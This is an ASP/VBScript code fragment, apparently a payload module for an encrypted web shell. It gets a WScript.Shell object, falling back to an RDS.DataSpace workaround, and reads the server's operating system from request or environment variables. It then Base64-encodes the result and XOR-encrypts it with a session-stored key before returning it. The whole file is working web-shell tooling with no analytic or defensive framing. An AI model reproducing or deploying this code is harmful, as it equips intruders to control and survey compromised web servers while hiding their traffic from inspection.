dim osInfo
currentPath=Server.MapPath(".")
osInfo=request.servervariables("os")

Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
Next
Encrypt=encryptResult
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function RDS(COM)
	Set r=CreateObject("RDS.DataSpace")
	Set RDS=r.CreateObject(COM,"")
End Function

Function GetWS()
	Dim WS,Key
	Key="WScript.Shell"
	Set WS=CreateObject(Key)
	if Not IsEmpty(WS) then Set GetWS=WS
	if IsEmpty(WS) then	Set WS=Hws
	Set WS=RDS(Key)
	Set GetWS=WS
End Function

Sub main()
		dim ws,sysenv,os
		Set ws=GetWS()
		set sysenv=ws.environment("system")
		with request
		os=.servervariables("os")
		if isnull(os) or os="" then	os=sysenv("os")
		osInfo=os
		end with
		finalResult=Base64Encode(osInfo)
		Response.binarywrite(Encrypt(finalResult))
End Sub